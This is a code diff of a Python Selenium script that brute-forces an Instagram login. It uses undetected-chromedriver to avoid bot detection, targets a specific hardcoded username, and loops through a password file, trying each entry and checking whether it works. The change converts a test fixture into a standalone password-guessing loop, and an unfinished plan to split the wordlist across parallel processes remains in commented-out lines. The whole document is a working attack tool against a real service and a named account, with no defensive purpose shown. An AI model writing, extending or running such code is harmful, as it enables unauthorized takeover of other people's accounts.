@@ -13,51 +13,58 @@ from Resources.pass_to_temp import password_list
 url = 'https://www.instagram.com/accounts/login/'
 proc = 0
 input_file = "test.txt"
-num_temp = 6
-groups = split_words(password_list(input_file), num_temp)
+num_temp = 1
+# groups = split_words(password_list(input_file), num_temp)
 username = 'Tim0ut_13'
-
 
 #
 
+options = uc.ChromeOptions()
 
-@pytest.fixture()
-def driver():
-    driver = uc.Chrome(headless=False, use_subprocess=True, version_main=116)
-    driver.implicitly_wait(1.5)
-    yield driver
-    driver.quit()
-    for i in range(num_temp):
-        file = f'temp{i + 1}.txt'
-        if os.path.isfile(file):
-            os.remove(file)
+options.add_argument("--disable-dev-shm-usage")
+options.add_argument("--no-sandbox")
+options.add_argument("--blink-settings=imagesEnabled=false")
+prefs = {}
+prefs["profile.managed_default_content_settings.images"] = 2
+# options.add_argument("--headless")
+options.add_experimental_option("prefs", prefs)
 
 
-def test_login(driver):
-    global proc
+
+def login():
+    driver = uc.Chrome(version_main=116, options=options)
     proc += 1
-
     login_page = LoginPage(driver, proc)
     cpu = f'Process n°{login_page.proc}'
+    print(f'\n{cpu} - Starting')
+
+    driver.implicitly_wait(3)
+
+    t1 = datetime.now()
+    global proc
+
+    ct = 0
 
     # Todo:
     #   1. password_list() method who return a list of strings
     #   form a temp file. Charge the list from file HERE
 
-    print(f'\n{cpu} - Starting')
-    print(f'\n{cpu} - Configuration')
-
     print(f'{cpu} - Connecting to {url}')
     login_page.open_page(url)
     login_page.is_cookies_here()
 
-    # passwords = password_list(f'temp{proc}.txt')
+    # temp = password_list(f'temp{proc}.txt')
+    temp = password_list(input_file)
 
-    t1 = datetime.now()
+    # t = (datetime.now() - t1).seconds
+    # print(f'Config Exec Time : {t}')
 
-    login_page.enter_username(username)
-    login_page.login_action('test')
-    t = (datetime.now() - t1).seconds
-    print(f'Logging Exec Time : {t}')
-    login_page.is_password_works()
-    time.sleep(15)
+    for password in temp:
+        # t1 = datetime.now()
+        ct += 1
+        login_page.login_action(username, password)
+        login_page.is_password_works(password, ct)
+        # t = (datetime.now() - t1).seconds
+        # print(f'Trying Password Exec Time : {t}')
+
+login()
